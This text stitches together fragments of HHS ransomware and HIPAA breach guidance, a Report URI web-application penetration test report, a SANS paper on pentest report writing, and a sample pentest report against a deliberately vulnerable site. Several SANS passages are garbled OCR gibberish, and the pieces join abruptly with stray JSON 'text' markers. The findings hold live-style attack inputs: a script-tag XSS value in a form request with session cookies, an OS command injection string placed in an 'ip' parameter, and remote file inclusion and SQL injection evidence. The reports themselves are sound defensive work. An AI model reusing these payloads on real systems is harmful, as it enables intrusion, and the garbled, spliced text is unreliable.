Part of a deeper analysis should involve assessing whether or not there was a breach of PHI as a result of the security incident. The presence of ransomware (or any malware) is a security incident under HIPAA that may also result in an impermissible disclosure of PHI in violation of the Privacy Rule and a breach, depending on the facts and circumstances of the attack. See the definition of disclosure at 45 C.F.R. 160.103 and the definition of breach at 45 C.F.R. 164.402. 6. Is it a HIPAA breach if ransomware infects a covered entity’s or business associate’s computer system? Whether or not the presence of ransomware would be a breach under the HIPAA Rules is a fact-specific determination. A breach under the HIPAA Rules is defined as, “...the acquisition, access, use, or disclosure of PHI in a manner not permitted under the [HIPAA Privacy Rule] which compromises the security or privacy of the PHI.” See 45 C.F.R. 164.402.6 When electronic protected health information (ePHI) is encrypted as the result of a ransomware attack, a breach has occurred because the ePHI encrypted by the ransomware was acquired (i.e., unauthorized 6 See also Section 13402 of the Health Information Technology for Economic and Clinical Health (HITECH) Act. 5\\nindividuals have taken possession or control of the information), and thus is a “disclosure” not permitted under the HIPAA Privacy Rule. Unless the covered entity or business associate can demonstrate that there is a “...low probability that the PHI has been compromised,” based on the factors set forth in the Breach Notification Rule, a breach of PHI is presumed to have occurred. The entity must then comply with the applicable breach notification provisions, including notification to affected individuals without unreasonable delay, to the Secretary of HHS, and to the media (for breaches affecting over 500 individuals) in accordance with HIPAA breach notification requirements. See 45 C.F.R. 164.400-414. 7. How can covered entities or business associates demonstrate “...that there is a low probability that the PHI has been compromised” such that breach notification would not be required? To demonstrate that there is a low probability that the protected health information (PHI) has been compromised because of a breach, a risk assessment considering at least the following four factors (see 45 C.F.R. 164.402(2)) must be",

    "text": "the PHI has been compromised” such that breach notification would not be required? To demonstrate that there is a low probability that the protected health information (PHI) has been compromised because of a breach, a risk assessment considering at least the following four factors (see 45 C.F.R. 164.402(2)) must be conducted: 1. the nature and extent of the PHI involved, including the types of identifiers and the likelihood of re-identification; 2. the unauthorized person who used the PHI or to whom the disclosure was made; 3. whether the PHI was actually acquired or viewed; and 4. the extent to which the risk to the PHI has been mitigated. A thorough and accurate evaluation of the evidence acquired and analyzed as a result of security incident response activities could help entities with the risk assessment process above by revealing, for example: the exact type and variant of malware discovered; the algorithmic steps undertaken by the malware; communications, including exfiltration attempts between the malware and attackers’ command and control servers; and whether or not the malware propagated to other systems, potentially affecting additional sources of electronic PHI (ePHI). Correctly identifying the malware involved can assist an entity to determine what algorithmic steps the malware is programmed to perform. Understanding what a particular strain of malware is programmed to do can help determine how or if a particular malware variant may laterally propagate throughout an entity’s enterprise, what types of data the malware is searching for, whether or not the malware may attempt to exfiltrate data, or whether or not the malware deposits hidden malicious software or exploits vulnerabilities to provide future unauthorized access, among other factors. Although entities are required to consider the four factors listed above in conducting their risk assessments to determine whether there is a low probability of compromise of the ePHI, entities are encouraged to consider additional factors, as needed, to appropriately evaluate the risk that the PHI has been compromised. If, for example, there is high risk of unavailability of the data, or high risk to the 6\\nintegrity of the data, such additional factors may indicate compromise. In those cases, entities must provide notification to individuals without unreasonable delay, particularly given that any delay may impact healthcare service and patient safety. Additionally, with respect to considering the extent to which the risk to PHI has been mitigated (the fourth factor) where ransomware has accessed PHI, the entity may wish to consider the impact of the ransomware on the integrity of the PHI. Frequently, ransomware, after encrypting the data it was seeking, deletes the original data and leaves only the data in encrypted form. An entity may be able to show mitigation of the impact of a ransomware attack affecting the integrity of PHI through the implementation of robust contingency plans including disaster recovery and data backup plans. Conducting frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack and ensuring the integrity of PHI affected by ransomware. Test",

    "text": "attack affecting the integrity of PHI through the implementation of robust contingency plans including disaster recovery and data backup plans. Conducting frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack and ensuring the integrity of PHI affected by ransomware. Test restorations should be periodically conducted to verify the integrity of backed up data and provide confidence in an organization’s data restoration capabilities. Integrity to PHI data is only one aspect when considering to what extent the risk to PHI has been mitigated. Additional aspects, including whether or not PHI has been exfiltrated, should also be considered when determining the extent to which the risk to PHI has been mitigated. The risk assessment to determine whether there is a low probability of compromise of the PHI must be thorough, completed in good faith and reach conclusions that are reasonable given the circumstances. Furthermore, in accordance with 45 C.F.R. 164.530(j)(iv)), covered entities and business associates must maintain supporting documentation sufficient to meet their burden of proof (see 45 C.F.R. 164.414) regarding the breach assessment – and if applicable, notification - process including: • documentation of the risk assessment demonstrating the conclusions reached; • documentation of any exceptions determined to be applicable to the impermissible use or disclosure (see 45 C.F.R. 164.402(1)) of the PHI; and • documentation demonstrating that all notifications were made, if a determination was made that the impermissible use or disclosure was a reportable breach. 8. Is it a reportable breach if the ePHI encrypted by the ransomware was already encrypted to comply with HIPAA? This is a fact specific determination. The HIPAA breach notification provisions apply to “unsecured PHI” (see 45 C.F.R. 164.402), which is protected health information (PHI) that is not secured through the use of a technology or methodology specified by the Secretary in guidance. If the electronic PHI (ePHI) is encrypted by the entity in a manner consistent with the Guidance to Render Unsecured Protected Health Information Unusable, Unreadable, or Indecipherable to Unauthorized Individuals7 such that it is no longer “unsecured PHI,” then the entity is not required to conduct a risk assessment to determine if there is a low probability of compromise, and breach notification is not required. 7 Available at http://www.hhs.gov/hipaa/for-professionals/breach-notification/guidance/index.html 7\\nHowever, even if the PHI is encrypted in accordance with the HHS guidance, additional analysis may still be required to ensure that the encryption solution, as implemented, has rendered the affected PHI unreadable, unusable and indecipherable to unauthorized persons. A full disk encryption solution may render the data on a computer system’s hard drive unreadable, unusable and indecipherable to unauthorized persons while the computer system (such as a laptop) is powered down. Once the computer system is powered on and the operating system is loaded, however, many full disk encryption solutions will transparently decrypt and encrypt files accessed by the user. For example, if a laptop encrypted with a full disk encryption solution in a manner consistent with HHS guidance8 is properly",

    "text": "Once the computer system is powered on and the operating system is loaded, however, many full disk encryption solutions will transparently decrypt and encrypt files accessed by the user. For example, if a laptop encrypted with a full disk encryption solution in a manner consistent with HHS guidance8 is properly shut down and powered off and then lost or stolen, the data on the laptop would be unreadable, unusable and indecipherable to anyone other than the authenticated user. Because the PHI on the laptop is not “unsecured PHI”, a covered entity or business associate need not perform a risk assessment to determine a low probability of compromise or provide breach notification. However, in contrast to the above example, if the laptop is powered on and in use by an authenticated user, who then performs an action (clicks on a link to a malicious website, opens an attachment from a phishing email, etc.) that infects the laptop with ransomware, there could be a breach of PHI. If full disk encryption is the only encryption solution in use to protect the PHI and if the ransomware accesses the file containing the PHI, the file containing the PHI will be transparently decrypted by the full disk encryption solution and access permitted with the same access levels granted to the user. Because the file containing the PHI was decrypted and thus “unsecured PHI” at the point in time that the ransomware accessed the file, an impermissible disclosure of PHI was made and a breach is presumed. Under the HIPAA Breach Notification Rule, notification in accordance with 45 CFR 164.404 is required unless the entity can demonstrate a low probability of compromise of the PHI based on the four factor risk assessment (see 45 C.F.R. 164.402(2)). 8 HHS guidance to render unsecured PHI unusable, unreadable or indecipherable to unauthorized individuals indicates that encryption solutions for data-at-rest must be consistent with NISP SP 800-111, Guide to Storage Encryption Technologies for End User Devices, in order for encrypted PHI to not be “unsecured PHI”. It must be noted, however, that consistency with NIST SP 800-111 requires not only the consideration of an encryption algorithm, but also consideration of additional areas of an encryption solution including encryption methodologies (e.g., full disk, virtual disk/volume, folder/file), cryptographic key management, and pre-boot authentication, where applicable. 8",

Report URI are the best real-time monitoring platform for cutting edge web standards. Their experience, focus, and exposure allow them to take the hassle out of collecting, processing, and understanding reports, giving customers just the information they need. Report URI have indicated the need for a repeat security test of their ‘Report URI’ application in order to identify vulnerabilities to attacks that could be launched across a computer network, and to provide security assurances regarding their systems. Such a test will allow Report URI to undertake remediation efforts and increase their overall security posture. 2.1 Scope & Duration This assessment included the following phase of work: • Phase 1 – Web application assessment of Report URI application The duration included 5 days effort (including reporting). Work commenced on 11/11/2024 and concluded on 19/11/2024. 2.2 Scenarios Included • Black-Box assessment – testing the web application while unauthenticated without additional information. This simulates a real-world threat posed to all Internet facing services. • Rogue-User Scenario – using credentials provided to simulate the risk as various levels of user account. This simulates the risk of a user either by choice or by being compromised attacking the system. • White-box assessment – using the source code provided. All the tests were performed against the production environment. 2.3 Target(s) • https://report-uri.com Confidential 4 3756 – Web App Test\\nConfidential 5 3756 - App Test <CustomerNameLong> 3 Executive Summary Overall, the Report URI application performed well during the assessment. It demonstrated a strong performance throughout the engagement, effectively thwarting attempts by authenticated attackers to exploit vulnerabilities like SQL Injection and Cross-Site Scripting that could potentially compromise the server or application.

The application also had proper user access controls in place and showed no signs of an attack surface for authorisation-based attacks. Only low-severity issues were identified that should be resolved to add additional layers of security to the application and further harden it. Full details of each issue as well as recommended remedial actions can be found documented in the Technical Findings section. 3.1 Next Steps A complete writeup of every issue is available in the body of this report. It includes required steps to confirm and replicate each issue, along with recommended remedial actions. Pentest recommend taking time to review the findings before arranging a triage meeting to determine the order of priority for remedial work. As a rule of thumb: • Low and Info Risk Items – Track these within a risk register and discuss remediation versus acceptance. If recommendations within this report are followed Pentest believe that the target’s security posture will improve. 3.2 Caveats Pentest provides no warranty that the target(s) are now free from other defects. Security is an ever- evolving field and consultancy is based on the opinions of the consultant, their understanding of the goals of Report URI as well as their individual experience. The findings of this project are based on a time-limited assessment and by necessity can only focus on approved targets which are in scope. An attacker would not be constrained by either time or scope limits and could circumvent controls which are impractical to assess via structured penetration testing. To appropriately secure assets Pentest encourage a cyclical approach to assessment. Each cycle should include: • Comprehensive Assessment – where a full list of findings is produced with the widest scope possible. • Focused Verification Testing – where solutions to the initial assessment’s findings are verified. Depending on how important the target is to the concerns of Report URI, Pentest recommend repeating the cycle every 6-months or 12-months at least. Confidential 5 3756 – Web App Test\\nConfidential 6 3756 - App Test <CustomerNameLong> 3.3 Risk Categories & Rationales Pentest use a simple risk categorisation of each vulnerability to focus the triage process at the risks which truly matter. The Common Vulnerability Scoring System (CVSS) is an industry standard formula. It generates a risk score between 0.0 and 10.0. The table below explains the risk categories and demonstrates rule-of-thumb equivalency with CVSS scores: Risk Category CVSS Score Rationales 8.1 – 10.0 Poses a severe risk which is easy to exploit. Begin the process of remediating immediately after the issue has been presented. 6.1 – 8.0 Poses a significant risk and can be exploited. Address these as soon as possible after any critical risks have been remediated. 4.1 – 6.0 Poses an important risk but may be difficult to exploit.

Remediate these to create a true defence-in-depth security posture. CVSS is not applicable to all risks. For example, it is incapable of capturing the risk of a “flat network design”. Experience has told us that this is a “high” risk in most cases. For this reason, the reader may find vulnerabilities which have no CVSS rating in our reports. We endeavour to provide the reason for omitting the risk score when that is the case, and to provide CVSS by default in all applicable cases.

Confidential 8\\n5 Technical Findings 5.1 Vulnerabilities in Outdated Dependencies Detected 5.1.1 Background Most software products are developed using APIs or libraries provided by third parties. Doing so reduces development time and cost and feeds into the “why re-invent the wheel?” philosophy. Once a component has been integrated into an application it must be upgraded regularly to guard against bugs and remove publicly known vulnerabilities. Failure to do so can mean that the application itself is at risk of exploitation due to weaknesses that exist in the supporting dependencies. This risk has been captured by the OWASP top 10 2021 project as category A06 labelled “Vulnerable and Outdated Components” defined at reference [1]. 5.1.2 Details During the assessment a few supporting JavaScript libraries were identified which contained publicly disclosed vulnerabilities such as Cross-Site Scripting. The table below identifies the location within the application and the related CVE associated with directly related vulnerabilities.

Moreover, the application implemented a strict CSP. The issue is raised to encourage updating the affected libraries and is not believed to constitute an immediate threat to Report URI or its users. 5.1.4 Recommendation The immediate recommendation is to download and integrate the latest supported versions of each outdated dependency. Pentest understands that this would be a significant undertaking for radius, due to changes in the underlying APIs and updated versions of the dependencies. As such, to ensure that updated components do not affect the user experience, a full User Acceptance Testing (UAT) would need to be carried out. The advice above would triage the initial problem only and would not prevent the situation from recurring. The long-term solution is to modify the Software Development Life Cycle (SDLC) to ensure that dependencies are regularly updated. OWASP provides a free tool called “dependency-check” (see reference [2]) which can be integrated into most build processes. 5.1.5 References [1] OWASP Top 10: A06_2021 - Vulnerable and Outdated Components [2] OWASP: OWASP Dependency Check [3] TaringAmberini: Ready to use Java Dependencies Vulnerability Checker [4] GitHub – Bootstrap version 4 issue 5.1.6 Affected Item(s) • https://report-uri.com Confidential 10\\n5.2 No Anti-Automation Protection 5.2.1 Background Web applications are subjected to unwanted automated usage. Usually, these events occur due to an improper usage of an existing functionality rather than the exploitation of vulnerabilities. Also, excessive misuse is commonly mistakenly reported as application Denial-of-Service (DoS) like HTTP-flooding, when in fact the DoS is a side-effect instead of the primary intent. Insufficient anti-automation occurs when a web application permits an attacker to automate a process that was originally designed to be performed only in a manual fashion, i.e. by a human web user 5.2.2 Details The application did implement anti-automation measures to protect against excessive automated requests. However, as the CloudFlare Bot Management was disabled for the test, remote attackers were able to send many requests to access or generate data. Although the application used CSRF tokens and validated them properly, it was possible to reuse the CSRF token because a non-standard client (Burp Suite) was used during testing. This client enabled manual manipulation and replay of HTTP requests, bypassing the typical flow of the application and allowing automation. Below is one request issued by the application to create a team: POST /team/create_team/ HTTP/2 Host: report-uri.com Cookie: _nss=1; __cf_bm=lYfP1QOpjdweC0p5pHFLAAvVIv1d91kYWSuu5nMGg5M-1731935807-1.0.1.1- ne_YxFLihgBqNOL5ndq8LwzKFHp5eFI7JSLlzYTJQtjdfQT8KX1YfX8kyMGMlnqzAE8eAKd90S.lm2x0AJ0KlA; __Host-report_uri_csrf=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83; __Host- report_uri_sess=c3k0adha2690t2qlqnspbbtr30 [...] Referer: https://report-uri.com/account/teams/ csrf_token=ec6c3b4d5aa5e5f8ffb26bd9e5f33c83&name=Test%22%3E%3Cscript%3Ealert%281%29%3C%2Fsc ript The following image shows the teams that were created by the consultant: Figure 1 – CSRF token reuse Confidential 11\\n5.2.3 Risk Analysis Pentest Risk Category CVSS 3.1/Low AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L Explanation The risk rating has been set to \"Low\" since testing was conducted with",

However, it is unlikely that Cloudflare Bot Management would have prevented this brute-force attempt under normal conditions, as only 6 requests were issued within a short time frame. The limited request volume would likely not trigger typical rate-limiting or anomaly detection mechanisms, making this vulnerability feasible for exploitation in scenarios with similar traffic patterns. 5.2.4 Recommendation Pentest recommends implementing anti-automation controls on the affected forms. By significantly delaying the success of a password-guessing attack, it provides an effective deterrent to attackers. Consider the following options to reduce the effectiveness of automated bot attacks: • CAPTCHA can help prevent automated bots by requiring manual interactions from a human. For example, Google’s ReCAPTCHA asks the user to identify an object (such as a car or traffic light) from a photo. • Rate-Limiting Requests simply reduces the number of requests an attacker can be made within reasonable time period to the server. 5.2.5 References [1] OWASP: Automated Threats to Web Applications 5.2.6 Affected Item(s) • https://report-uri.com Confidential 12\\n6 6 Additional Information 6.1 WHOIS Database The WHOIS database stores information about the individual or organisation who owns and manages a domain or IP address range.

A lot of currently available penetration testing resources lack report writing ! methodology and approach which leads to a very big gap in the penetration testing cycle. ! ! Report in its definition is a statement of the results of an investigation or of any matter on ! which definite information is required (Oxford English Dictionary). ! ! A penetration test is useless without something tangible to give to a client or ! executive officer. A report should detail the outcome of the test and, if you are making ! ! recommendations, document the recommendations to secure any high-risk systems ! (Whitaker & Newman, 2005). Report Writing is a crucial part for any service providers ! ! especially in IT service/ advisory providers. In pen-testing the final result is a report that ! shows the services provided, the methodology adopted, as well as testing results and ! ! recommendations. As one of the project managers at major electronics firm Said \"We ! don't actually manufacture anything. Most of the time, the tangible products of this ! ! department [engineering] are reports.\" There is an old saying that in the consulting ! business: “If you do not document it, it did not happen.” (Smith, LeBlanc & Lam, 2004) ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Many people consider business reports as dry, uninteresting documents, which take a great deal of time and efforts to prepare. The reality is that they are an essential part of doing business and one's ability to be proficient in this area is critical to the ability to pursue commercial success (McCarthy, 1979; Ronstadt, 1984; Thompson, 2003c). Penetration testing report presents the approach followed and the results of the vulnerability assessment and penetration test of a target system with a detailed recommendation of how to mitigate the risks. Target reader for the penetration testing report will vary, executive summary will be read by the senior management and the technical details will be read by the IT and/or information security responsible people. This paper begins with a conventional approach to develop a penetration testing report starting from collecting information, drafting the first report and ending with a professional report. As shown in figure 1 the penetration testing report writing stages are: Report planning, Information collection, writing the first draft and reviewing and finalization. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! !

Report Planning ! ! ! Report objectives ! ! Report objectives help the reader to focus on the main points of the penetration ! testing and the report e.g. PCI compliance once the objectives are clear both the reader ! ! and the penetration tester(s) will know what exactly the aim of the project. This section ! explains why we conduct the penetration testing and the benefit of it. This may be found ! ! in the Request for Proposal, be part of risk analysis, be part of compliance or to know the ! current stat of the target testing environment.

This may include: • In mission critical infrastructure the organization may need to make sure some key IT persons are available during the test in case some thing does wrong e.g. server crash. • In rapidly changing IT infrastructure, the changes need to be freeze in the penetration testing scope during the test to make sure that the testing is exactly assessing the current IT (the penetration testing scope). • Even though there is no 100% security, the report will show the risks in the penetration testing scope during this period of time any risks after this time may arise because of some changes in the IT infrastructure of changing in the configuration. Pen Tester needs to make sure that sufficient time is allotted in the project plan. Sample time table is shown in 1.4.Timeline in Appendix A Sample Penetration Testing",

Divide your report writing into tasks to simplify ! things and focus of them. Planning the report will help in delivering an effective report. ! ! Typically, 60% of your time should be spent writing the draft. Pen Tester needs to ! consider the client’s acceptance process as well as the fact that it may take longer than ! ! expected. ! ! Consider the target audiences ! ! Penetration testing reports usually have a number of target audiences/audience ! groups to reach, so a report will often have a hierarchical structure to support different ! ! levels of details. In designing the report form and style, the following target audience ! characteristics should be considered: ! ! • Their need for the report (i.e. operational planning, resource ! allocation, approval), ! ! • Position in the organization ! ! • Knowledge of the report topic(i.e. purpose), \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! • Responsibility or authority to make decision based on the report, and • Personal demographics (i.e. age, alliances, attitudes). Report audiences include Information Security Manager, Chief Information Security Officer, Information Technology Manager and technical teams. More information about the scope and target audiences can be found also in the scope of work of the assignment. Report classification Since Penetration Testing Report have sensitive information such as, servers IP addresses and its information, some applications information, vulnerability, threats, exploits and more, it should be considered to be in every high rank of confidentiality e.g. TOP SECRET and the report will be dealt with accordingly. The report classification will be based on the target organization information classification policy. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! !

Finally after submitting the report, the penetration tester should delete any available information that he have and inform the client that all related information has have been erased (This step should be clearly mentioned and agreed upon in the service agreement documents. As Andrew Whitaker and Daniel P. Newman (Whitaker & Newman, 2005) stated that 'your ethical responsibilities do not stop when the test is done, however. After the test is completed, you should perform due diligence to ensure the confidentiality of the test results. Some penetration testing firms have known to circulate test results to other companies as samples of their work. These results contain detailed steps on how to break into an e-finance website for a particular financial institution and collect sensitive customer data. You can imagine the shock of the institution when it discovered these contents being distributed to its competitors!

Due to the nature of penetrating testing and utilizing more than one way, tools, ! ! computers, etc., penetration tester needs to make sure that he collected all the information ! in all stages, system used and tools. This will ease his report writing and make all ! information that he need available either in each stage, moving to the next stage, using ! ! information and analyzing it either in the penetration testing activity or during report ! writing.

Collecting the information during the penetration testing stages/steps is a very ! ! important step to be able to write the report. This include, scanning results, vulnerability ! assessment, snap shots of the findings and exploits (if any), etc. Pen-tester needs to ! ! consider information collection in all steps that he performs during the test.

Writing the first draft Start writing a rough draft report using all relevant information gathered in stage 2.2 using the relevant notes. At this stage, it is highly recommended not to be concerned about proofreading and editing. Typically, 60% of report writing time will be in writing the draft. It may be helpful to use a symbol such as \"#\" or adding highlights to mark the spot where pen-tester needs to check back later to edit a paragraph. Delete the symbol once editing is completed. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# S( ! ( ! 2.4. Review and finalization ! ! Draft needs to be reviewed to enhance it, peer review is highly recommended to have ! ! a second opinion. In case the penetration testing has been conducted by a team, all team ! members need to review and/or edit it. Peer review depends on the type of penetration ! ! testing conducted, if it is a black box penetration testing, one of the penetration testing ! team needs to review the report. If the test is white penetration testing, someone with ! ! knowledge of the target system will review the report collaboratively. This will lead to ! much better results. Report review depends also on the organization's procedure and the ! ! way that they handle the service.

For example, for weak authentication protocols being used to validate accounts for accessing a customer database through the ASP Web application, pen tester may provide more than option for mitigating the risk such as: 1-Implement Public Key Infrastructure (PKI) by providing certificate to all users of the database and require certificate-based authentication on the front-end )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! !

The vulnerabilities are assigned a risk rating based on threat, vulnerability and impact. 1.3. Assumption While writing the report, we assume that both IP addresses are considered to be public IP addresses, NDA and rules of engagement has been signed and based on the information gathering phase the company name is GPEN.KM. 1.4.

Figure 1 Total Risks GPEN.KM needs to pay more attention to information security. We were able to access one server in less than one hour. GPEN.KM needs to invest in implementing a defense-in-depth approach to have multiple layers of security to protect their information asset. Other areas such as processes and people should be emphasized as well. Systems and networks hardening and secure configurations, for instance, should be implemented to strengthen the different layers of security within GPEN.KM . Below are the high level findings from the external penetration test: • GPEN.KM lacks a defense in depth (multi-layered) security strategy which if implemented will help GPEN.KM achieves better security level. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >>( ! ( ! • We found that both servers are not protected by a firewall and can present a ! ! security risk since the host runs a number of services such as Microsoft terminal ! services without being configured for optimal security. GPEN.KM must design ! ! the Firewall policy as follows: ! o Apply rules to allow only public services such as mail and web access. ! ! o Apply anti-mapping rules on the border router and primary firewall. ! o Allow only authorized IPs to connect to other services or best disable ! ! unneeded services. ! • It was obvious that GPEN.KM patch management policy and procedure is either ! ! not existing or not implemented correctly. One of these servers was running ! windows 2000",

This opened a very high security risk ! on the organization. ! ! • Services installed were running with default configuration such as FTP. ! Web application hosted in 192.168.1.75 is running multiple security vulnerability ! ! such as SQL injection and XSS. An attacker can gain access to customer ! information and manipulate it. GPEN.KM has to implement input validation and ! \"#$re!%-&d'e(s#ig)*n )t&h'e+ !w,!e-b. a/p0p!l.ic-a1ti2o!n1 .c0o3m!0po0n4e5n!t.. 5B6e7st! 5p8ra9c5tic!.e4 i6s 7to!: h;a8v3e! -3-/ti;e0r !d3e8s3ig;n!. At least the application server and DB server should be hosted in deferent servers and segregated by a firewall. 1.6. Summary of Recommendation Adopt defense-in-depth approach where GPEN.KM utilizes variety of security tools/systems and processes to protect its assets and information. Among these: • Deploy Host Intrusion Prevention Systems –HIPS on servers and desktops, also enable personal firewall on desktop (such as Microsoft Windows firewall). • Perform security hardening on servers in the production environment especially those in the Internet and/or external DMZs. • Implement Patch management system(s) to provide centralized control over fixes, updates and patches to all systems, devices and equipments. This will minimize overhead on operations team and will elevate security resistance. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! !

At least the ! application server and DB server should be hosted in deferent servers and ! ! segregated by a firewall. ! • Conduct vulnerability assessment at least twice a year and penetration testing ! ! at least once a year or if there is a major change in the information assets. ! • Develop and implement a training path for the current IT staff. ! ! ! 2.

Introduction 2.1 Background companie was contracted by SampleCompany Ltd to perform a penetration test on its Internet facing systems in order to determine the effectiveness of the implemented security measures. The test was agreed in the Contract No. SC340023 of 01 March 2020 between SampleCompany Ltd and companie. The fieldwork was completed between 15 April 2020 and 30 April 2020. 2.2 Objectives The objective of the penetration test was to evaluate the current state of the websites in scope from a security perspective and determine the risk of a successful attack by a malicious hacker or nefarious user from the Internet. 2.3 Scope The following systems belonging to SampleCompany Ltd were in scope: Target Description https://pentest-ground.com:4280/ pentest-ground.com 2.4 Approach The penetration test was performed in a \"black box\" manner, meaning that we did not have any prior information about the target systems. Our tests simulated an external threat (hacker, malicious user) located somewhere on the Internet who tried to find vulnerabilities in the target systems and exploit them in order to gain unauthorized access to sensitive information or affect the correct functionality of the systems. 5\\n2.5 Methodology All of our tests were performed by combining our professional experience with well known methodologies such as OWASP Top 10 and NIST 800-115. 2.6 Disclaimer Please note that it is impossible to test networks, information systems and people for every potential security vulnerability. This report does not form a guarantee that your assets are secure from all threats. The tests performed and their results are only from the point of view of companie. companie is unable to ensure or guarantee that your assets are completely safe from any form of attack, including those that are not known at the time of the penetration test. Furthermore, any changes to the tested systems may have an impact on their security level either in a negative or positive way. Our tests were performed in a time limited approach and our service was best-effort. 6\\n3. Executive summary The penetration test revealed several high risk vulnerabilities together with multiple medium and low risk issues. We recommend implementing the measures suggested for each finding in order to improve the security posture of the affected systems.

Findings (grouped by target) 4.1 Target: https://pentest-ground.com:4280/ 4.1.1 Remote File Inclusion Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/fi/ Method GET Vulnerable Parameter page (Query Parameter) Evidence Injecting the remote file URL https://pentest- tools.com/file.txt in the page query parameter resulted in the content of the remote file being present in the response. Request / Response Vulnerability description We found that the target web application is vulnerable to Remote File Inclusion (RFI) attacks. This vulnerability occurs when the application allows external files to be included and executed within its environment. 11\\nRisk description The risk varies greatly, depending on the behaviour of programming language used on the server. The impact can range from client side vulnerabilities, like Cross-Site Scripting, to server side issues, like Remote Code Execution. If the programming language functionality used to import the resource just embeds the remote file content in the HTTP response, you are looking at impact on the client-side. On the other hand, if the content is treated and interpreted as code on the server, you are potentially dealing with Remote-Code Execution. Recommendation The most effective solution to eliminating file inclusion vulnerabilities is to avoid passing raw user-submitted input to any filesystem API. If this is not possible, the application can maintain a white list of files that may be included by the page, and then",

The vulnerability is caused by improper input sanitization and allows an attacker to inject arbitrary SQL commands and execute them directly on the database. Risk description The risk exists that an attacker gains unauthorized access to the information from the database of the application. He could extract and alter information such as: application usernames, passwords, client information and other application specific data. Recommendation We recommend implementing a validation mechanism for all the data received from the users. The best way to protect against SQL Injection is to use prepared statements for every SQL query performed on the database. Otherwise, the user input can also be sanitized using dedicated methods such as: mysqli_real_escape_string. 15\\nReferences https://owasp.org/www-community/attacks/SQL_Injection https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_She et.html Classification Category ID / Value CWE CWE-89 OWASP Top 10 - 2017 A1 - Injection OWASP Top 10 - 2021 A3 - Injection Verification ✔ This finding was validated so it is not a False Positive. 16\\n4.1.3 OS Command Injection Affected target https://pentest-ground.com:4280/ Status: Open Evidence URL https://pentest-ground.com:4280/vulnerabilities/exec/ Method POST Vulnerable Parameter ip (Body Parameter) Evidence Injected the echo ttp1739356543.6927|rev|sed -e 's/^/ptt/' -e 's/\\./dot/'|tr a-z A-Z command in the ip body parameter and found the expected command output (PTT7296DOT3456539371PTT) in the response To validate the vulnerability, we extracted",

The kernel version is 5.10.0-32-amd64, and the hostname is ba766be4f6cb. Request / Response Vulnerability description We found that the target web application can be manipulated into running operating system commands on its host machine. This vulnerability arises from the application improperly handling or sanitizing user input which reaches OS functions. 17\\nRisk description The risk is that an attacker can use the application to run OS commands with the privileges of the vulnerable application. This could lead (but not limited) to Remote Code Execution, Denial of Service, Sensitive Information Disclosure, Sensitive Information Deletion. Recommendation There are multiple ways to mitigate this attack: - avoid calling OS commands directly (use built-in library functions) - escape values added to OS commands specific to each OS - implement parametrization in conjunction with Input Validation (segregate data by command; implement Positive or whitelist input validation; White list Regular Expression) In order to provide Defense in Depth, we also recommend to allocate the lowest privileges to web applications.

This vulnerability allows including files that are already locally present on the server, by exploiting the vulnerable inclusion procedures implemented in the application. Risk description The risk exists that an attacker can manipulate the affected parameter in order to load and sometimes execute any locally stored file. This could lead to reading arbitrary files, code execution, Cross-Site Scripting, denial of service, sensitive information disclosure.

This vulnerability is caused by inadequate input validation, allowing a malicious actor to inject and execute JavaScript code in the context of another user's session. DOM-based XSS is purely client-side, meaning the malicious script runs as a result of modifying the Document Object Model (DOM) environment in the victim's browser, without sending the payload to the server. Risk description The risk is that the code injected by an attacker could potentially lead to effects such as stealing session cookies, calling application features on behalf of another user, or exploiting browser vulnerabilities. Recommendation There are several ways to mitigate DOM-based XSS attacks. We recommend to: - never trust user input - encode and escape user input on the client side as well - implement Content Security Policy (CSP) - use the HTTPOnly cookie flag to protect from cookie theft - try to avoid using innerHTML or document.write() to insert untrusted content directly into your HTML, as these methods don't filter malicious scripts. Use methods that provide finer control, such as creating elements via document.createElement() and safely inserting values with Element.textContent. If you must use unsafe methods, pass",

Recommendation We recommend rewriting the vulnerable code to allow requests only to specific URLs (whitelist approach). Blacklists are usually ineffective, as there is a myriad of ways to bypass them. Furthermore, disable support for any unwanted protocols, like ftp://, file://. Lastly, internal services should be protected by authentication and authorization mechanisms, thus applying a defense-in-depth approach.

This can be used in phishing attacks, as targets will receive a trusted URL and might not notice the subsequent redirect. 40\\nRecommendation If possible, the application should not incorporate user input into URLs. Instead, use direct links to redirect towards the target page. If, however, this is not possible, you should only accept relative URLs as input.

Evidence Response has an internal server error status code: 500 Request / Response Vulnerability description We noticed that the target application's website does not properly handle or incorrectly manages exceptional conditions like Internal Server Errors. These errors can reveal sensitive information through their error messages. For instance, an error message could inadvertently disclose system paths or private application details. Risk description The risk exists that attackers could utilize information revealed in Internal Server Error messages to mount more targeted and effective attacks. Detailed error messages 44\\ncould, for example, expose a path traversal weakness (CWE-22) or other exploitable system vulnerabilities. Recommendation Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker 